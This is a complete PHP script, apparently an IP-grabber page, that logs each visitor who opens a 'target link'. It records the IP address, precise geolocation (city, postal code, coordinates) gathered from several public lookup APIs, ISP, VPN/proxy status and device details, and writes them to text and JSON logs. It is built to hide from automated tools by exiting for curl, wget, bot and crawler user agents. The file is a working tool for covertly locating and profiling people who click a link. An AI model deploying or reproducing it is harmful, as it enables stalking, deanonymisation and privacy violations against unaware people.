<?php

// Get real IP address with fallback chain
$ipaddress = '';

// Try multiple methods to get real IP (handles proxies, VPNs, etc.)
if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
    $ipaddress = $_SERVER['HTTP_CF_CONNECTING_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
    $ipaddress = trim($ips[0]);
} elseif (!empty($_SERVER['HTTP_X_FORWARDED'])) {
    $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
} elseif (!empty($_SERVER['HTTP_FORWARDED_FOR'])) {
    $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
} elseif (!empty($_SERVER['HTTP_FORWARDED'])) {
    $ipaddress = $_SERVER['HTTP_FORWARDED'];
} elseif (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['REMOTE_ADDR'])) {
    $ipaddress = $_SERVER['REMOTE_ADDR'];
}

// Validate IP format
if (!filter_var($ipaddress, FILTER_VALIDATE_IP)) {
    $ipaddress = $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
}

// Skip logging for internal health checks (localhost) or automated agents
$ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
if (strpos($ipaddress, '127.') === 0 || $ipaddress === '::1' || $ipaddress === 'UNKNOWN' || preg_match('/curl|wget|python-requests|healthcheck|bot|spider/i', $ua)) {
    exit;
}

// Get browser user agent
$browser = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';

// Parse user agent for detailed device info
$device_info = parse_user_agent($browser);

// Get timestamp
$timestamp = date('Y-m-d H:i:s');
$timestamp_unix = time();

// Get IP Geolocation info
$geo_info = get_ip_geolocation($ipaddress);

// Get additional headers
$accept_language = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'Unknown';
$accept_encoding = $_SERVER['HTTP_ACCEPT_ENCODING'] ?? 'Unknown';
$referer = $_SERVER['HTTP_REFERER'] ?? 'Direct';

// Create detailed structured log entry
$log_entry = "╔" . str_repeat("═", 78) . "╗\n";
$log_entry .= "║ [" . $timestamp . "] TARGET LINK OPENED\n";
$log_entry .= "╠" . str_repeat("═", 78) . "╣\n";
$log_entry .= "║ IP ADDRESS: " . trim($ipaddress) . "\n";
$log_entry .= "║ COUNTRY: " . $geo_info['country'] . " (" . $geo_info['country_code'] . ")\n";
$log_entry .= "║ STATE/REGION: " . $geo_info['state'] . " | " . $geo_info['region'] . "\n";
$log_entry .= "║ CITY: " . $geo_info['city'] . " | Postal: " . $geo_info['postal_code'] . "\n";
$log_entry .= "║ COORDINATES: Lat " . $geo_info['latitude'] . " | Lon " . $geo_info['longitude'] . "\n";
$log_entry .= "║ TIMEZONE: " . $geo_info['timezone'] . "\n";
$log_entry .= "╠" . str_repeat("═", 78) . "╣\n";
$log_entry .= "║ NETWORK INFO:\n";
$log_entry .= "║   ISP: " . $geo_info['isp'] . "\n";
$log_entry .= "║   ASN: " . $geo_info['as_name'] . "\n";
$log_entry .= "║   ORGANIZATION: " . $geo_info['organization'] . "\n";
$log_entry .= "║   VPN: " . $geo_info['vpn'] . " | PROXY: " . $geo_info['proxy'] . " | MOBILE: " . $geo_info['mobile'] . "\n";
$log_entry .= "║   HOSTING: " . $geo_info['hosting'] . " | TOR: " . $geo_info['tor'] . "\n";
$log_entry .= "╠" . str_repeat("═", 78) . "╣\n";
$log_entry .= "║ DEVICE INFO:\n";
$log_entry .= "║   OS: " . $device_info['os'] . "\n";
$log_entry .= "║   BROWSER: " . $device_info['browser'] . "\n";
$log_entry .= "║   DEVICE TYPE: " . $device_info['device_type'] . "\n";
$log_entry .= "║   DEVICE NAME: " . $device_info['device_name'] . "\n";
$log_entry .= "╠" . str_repeat("═", 78) . "╣\n";
$log_entry .= "║ CONNECTION INFO:\n";
$log_entry .= "║   LANGUAGE: " . $accept_language . "\n";
$log_entry .= "║   ENCODING: " . $accept_encoding . "\n";
$log_entry .= "║   REFERER: " . $referer . "\n";
$log_entry .= "║   SERVER TIME: " . $timestamp . " (" . date('T') . ")\n";
$log_entry .= "╠" . str_repeat("═", 78) . "╣\n";
$log_entry .= "║ FULL USER-AGENT: " . $browser . "\n";
$log_entry .= "╚" . str_repeat("═", 78) . "╝\n\n";

// Write to IP log file
$file = 'ip.txt';
$fp = fopen($file, 'a');
if ($fp) {
    fwrite($fp, $log_entry);
    fclose($fp);
}

// Create comprehensive JSON log
$json_file = 'ip.json';
$json_entry = [
    'timestamp' => $timestamp,
    'timestamp_unix' => $timestamp_unix,
    'ip' => trim($ipaddress),
    'geolocation' => [
        'country' => $geo_info['country'],
        'country_code' => $geo_info['country_code'],
        'region' => $geo_info['region'],
        'state' => $geo_info['state'],
        'city' => $geo_info['city'],
        'postal_code' => $geo_info['postal_code'],
        'district' => $geo_info['district'],
        'latitude' => $geo_info['latitude'],
        'longitude' => $geo_info['longitude'],
        'timezone' => $geo_info['timezone']
    ],
    'network' => [
        'isp' => $geo_info['isp'],
        'as_name' => $geo_info['as_name'],
        'asn' => $geo_info['asn'],
        'organization' => $geo_info['organization'],
        'mobile' => $geo_info['mobile'],
        'vpn' => $geo_info['vpn'],
        'proxy' => $geo_info['proxy'],
        'hosting' => $geo_info['hosting'],
        'tor' => $geo_info['tor']
    ],
    'device' => [
        'os' => $device_info['os'],
        'browser' => $device_info['browser'],
        'device_type' => $device_info['device_type'],
        'device_name' => $device_info['device_name']
    ],
    'connection' => [
        'user_agent' => $browser,
        'accept_language' => $accept_language,
        'accept_encoding' => $accept_encoding,
        'referer' => $referer
    ],
    'server_info' => [
        'server_time' => $timestamp,
        'server_timezone' => date('T'),
        'server_utc_offset' => date('O')
    ],
    'action' => 'link_opened'
];

$existing = [];
if (file_exists($json_file)) {
    $json_content = file_get_contents($json_file);
    $existing = json_decode($json_content, true) ?? [];
}
$existing[] = $json_entry;
file_put_contents($json_file, json_encode($existing, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));

// Helper function to parse user agent
function parse_user_agent($ua) {
    $result = [
        'os' => 'Unknown',
        'browser' => 'Unknown',
        'device_type' => 'Unknown',
        'device_name' => 'Unknown'
    ];
    
    // Detect OS
    if (preg_match('/Windows NT 10.0/', $ua)) $result['os'] = 'Windows 10';
    elseif (preg_match('/Windows NT 11.0/', $ua)) $result['os'] = 'Windows 11';
    elseif (preg_match('/Windows NT 6.3/', $ua)) $result['os'] = 'Windows 8.1';
    elseif (preg_match('/Windows NT 6.2/', $ua)) $result['os'] = 'Windows 8';
    elseif (preg_match('/Windows NT 6.1/', $ua)) $result['os'] = 'Windows 7';
    elseif (preg_match('/Mac OS X/', $ua)) $result['os'] = 'macOS';
    elseif (preg_match('/iPhone/', $ua)) $result['os'] = 'iOS';
    elseif (preg_match('/iPad/', $ua)) $result['os'] = 'iPadOS';
    elseif (preg_match('/Android/', $ua)) $result['os'] = 'Android';
    elseif (preg_match('/Linux/', $ua)) $result['os'] = 'Linux';
    
    // Detect Browser
    if (preg_match('/Chrome/', $ua)) $result['browser'] = 'Chrome';
    elseif (preg_match('/Safari/', $ua)) $result['browser'] = 'Safari';
    elseif (preg_match('/Firefox/', $ua)) $result['browser'] = 'Firefox';
    elseif (preg_match('/Edge/', $ua)) $result['browser'] = 'Edge';
    elseif (preg_match('/Opera/', $ua)) $result['browser'] = 'Opera';
    
    // Detect Device Type
    if (preg_match('/Mobile|Android|iPhone|iPad/', $ua)) {
        $result['device_type'] = 'Mobile';
        if (preg_match('/iPad/', $ua)) $result['device_type'] = 'Tablet';
    } else {
        $result['device_type'] = 'Desktop';
    }
    
    // Extract device name
    if (preg_match('/iPhone/', $ua)) $result['device_name'] = 'iPhone';
    elseif (preg_match('/iPad/', $ua)) $result['device_name'] = 'iPad';
    elseif (preg_match('/Android/', $ua)) {
        if (preg_match('/SM-/', $ua)) $result['device_name'] = 'Samsung';
        elseif (preg_match('/Pixel/', $ua)) $result['device_name'] = 'Google Pixel';
        else $result['device_name'] = 'Android Device';
    } else {
        $result['device_name'] = 'Computer';
    }
    
    return $result;
}

// Helper function to get IP geolocation with multiple fallback APIs
function get_ip_geolocation($ip) {
    // Default result structure
    $result = [
        'country' => 'Unknown',
        'country_code' => 'Unknown',
        'region' => 'Unknown',
        'state' => 'Unknown',
        'city' => 'Unknown',
        'postal_code' => 'Unknown',
        'district' => 'Unknown',
        'isp' => 'Unknown',
        'as_name' => 'Unknown',
        'asn' => 'Unknown',
        'organization' => 'Unknown',
        'latitude' => 'N/A',
        'longitude' => 'N/A',
        'timezone' => 'Unknown',
        'vpn' => 'No',
        'proxy' => 'No',
        'tor' => 'No',
        'hosting' => 'No',
        'mobile' => 'No'
    ];
    
    // Try to get geolocation from free APIs
    $cache_file = 'geo_cache_' . md5($ip) . '.json';
    
    if (file_exists($cache_file)) {
        $cached = json_decode(file_get_contents($cache_file), true);
        if ($cached && time() - $cached['cached_at'] < 86400) { // 24 hour cache
            return $cached['data'];
        }
    }
    
    // Multiple geolocation APIs with fallbacks
    $api_results = [];
    
    // API 1: ip-api.com (most detailed, no rate limit for non-commercial)
    $api_results[] = fetch_ip_api_com($ip);
    
    // API 2: ipwho.is (good fallback)
    $api_results[] = fetch_ipwho_is($ip);
    
    // API 3: ipapi.co (rate limited but good data)
    $api_results[] = fetch_ipapi_co($ip);
    
    // Merge results - use first successful API for each field
    foreach ($api_results as $api_data) {
        if (empty($api_data)) continue;
        
        foreach ($result as $key => $value) {
            if ($value === 'Unknown' || $value === 'N/A' || empty($value)) {
                if (isset($api_data[$key]) && $api_data[$key] !== 'Unknown' && $api_data[$key] !== 'N/A' && !empty($api_data[$key])) {
                    $result[$key] = $api_data[$key];
                }
            }
        }
    }
    
    // If still unknown, try to at least get country from simple API
    if ($result['country'] === 'Unknown') {
        $simple = fetch_simple_country($ip);
        if ($simple) {
            $result['country'] = $simple['country'] ?? 'Unknown';
            $result['country_code'] = $simple['country_code'] ?? 'Unknown';
        }
    }
    
    // Cache the result
    $cache_data = [
        'cached_at' => time(),
        'data' => $result
    ];
    file_put_contents($cache_file, json_encode($cache_data));
    
    return $result;
}

// Fetch from ip-api.com
function fetch_ip_api_com($ip) {
    $api_url = 'http://ip-api.com/json/' . $ip . '?fields=status,message,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,isp,org,as,asname,mobile,proxy,hosting,query';
    
    $context = stream_context_create([
        'http' => [
            'timeout' => 5,
            'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        ]
    ]);
    
    $response = @file_get_contents($api_url, false, $context);
    if (!$response) return [];
    
    $data = json_decode($response, true);
    if (!$data || $data['status'] !== 'success') return [];
    
    return [
        'country' => $data['country'] ?? 'Unknown',
        'country_code' => $data['countryCode'] ?? 'Unknown',
        'region' => $data['regionName'] ?? $data['region'] ?? 'Unknown',
        'state' => $data['regionName'] ?? $data['region'] ?? 'Unknown',
        'city' => $data['city'] ?? 'Unknown',
        'postal_code' => $data['zip'] ?? 'Unknown',
        'district' => $data['district'] ?? 'Unknown',
        'isp' => $data['isp'] ?? 'Unknown',
        'as_name' => $data['as'] ?? $data['asname'] ?? 'Unknown',
        'asn' => $data['as'] ?? 'Unknown',
        'organization' => $data['org'] ?? 'Unknown',
        'latitude' => $data['lat'] ?? 'N/A',
        'longitude' => $data['lon'] ?? 'N/A',
        'timezone' => $data['timezone'] ?? 'Unknown',
        'mobile' => ($data['mobile'] ?? false) ? 'Yes' : 'No',
        'proxy' => ($data['proxy'] ?? false) ? 'Yes' : 'No',
        'hosting' => ($data['hosting'] ?? false) ? 'Yes' : 'No',
        'vpn' => 'No',
        'tor' => 'No'
    ];
}

// Fetch from ipwho.is
function fetch_ipwho_is($ip) {
    $api_url = 'https://ipwho.is/' . $ip;
    
    $context = stream_context_create([
        'http' => [
            'timeout' => 5,
            'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        ]
    ]);
    
    $response = @file_get_contents($api_url, false, $context);
    if (!$response) return [];
    
    $data = json_decode($response, true);
    if (!$data || ($data['success'] ?? false) === false) return [];
    
    return [
        'country' => $data['country'] ?? 'Unknown',
        'country_code' => $data['country_code'] ?? 'Unknown',
        'region' => $data['region'] ?? 'Unknown',
        'state' => $data['region'] ?? 'Unknown',
        'city' => $data['city'] ?? 'Unknown',
        'postal_code' => $data['postal'] ?? 'Unknown',
        'district' => 'Unknown',
        'isp' => $data['connection']['isp'] ?? 'Unknown',
        'as_name' => 'AS' . ($data['connection']['asn'] ?? 'Unknown'),
        'asn' => $data['connection']['asn'] ?? 'Unknown',
        'organization' => $data['connection']['org'] ?? 'Unknown',
        'latitude' => $data['latitude'] ?? 'N/A',
        'longitude' => $data['longitude'] ?? 'N/A',
        'timezone' => $data['timezone']['id'] ?? 'Unknown',
        'mobile' => 'No',
        'proxy' => 'No',
        'hosting' => 'No',
        'vpn' => 'No',
        'tor' => 'No'
    ];
}

// Fetch from ipapi.co
function fetch_ipapi_co($ip) {
    $api_url = 'https://ipapi.co/' . $ip . '/json/';
    
    $context = stream_context_create([
        'http' => [
            'timeout' => 5,
            'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        ]
    ]);
    
    $response = @file_get_contents($api_url, false, $context);
    if (!$response) return [];
    
    $data = json_decode($response, true);
    if (!$data || isset($data['error'])) return [];
    
    return [
        'country' => $data['country_name'] ?? $data['country'] ?? 'Unknown',
        'country_code' => $data['country_code'] ?? 'Unknown',
        'region' => $data['region'] ?? 'Unknown',
        'state' => $data['region'] ?? 'Unknown',
        'city' => $data['city'] ?? 'Unknown',
        'postal_code' => $data['postal'] ?? 'Unknown',
        'district' => 'Unknown',
        'isp' => $data['org'] ?? $data['isp'] ?? 'Unknown',
        'as_name' => $data['asn'] ?? 'Unknown',
        'asn' => $data['asn'] ?? 'Unknown',
        'organization' => $data['org'] ?? 'Unknown',
        'latitude' => $data['latitude'] ?? 'N/A',
        'longitude' => $data['longitude'] ?? 'N/A',
        'timezone' => $data['timezone'] ?? 'Unknown',
        'mobile' => 'No',
        'proxy' => 'No',
        'hosting' => 'No',
        'vpn' => 'No',
        'tor' => 'No'
    ];
}

// Simple country fallback
function fetch_simple_country($ip) {
    // Try freegeoip.app as last resort
    $api_url = 'https://freegeoip.app/json/' . $ip;
    
    $context = stream_context_create([
        'http' => [
            'timeout' => 3,
            'user_agent' => 'Mozilla/5.0'
        ]
    ]);
    
    $response = @file_get_contents($api_url, false, $context);
    if (!$response) return [];
    
    $data = json_decode($response, true);
    if (!$data) return [];
    
    return [
        'country' => $data['country_name'] ?? 'Unknown',
        'country_code' => $data['country_code'] ?? 'Unknown'
    ];
}

?>
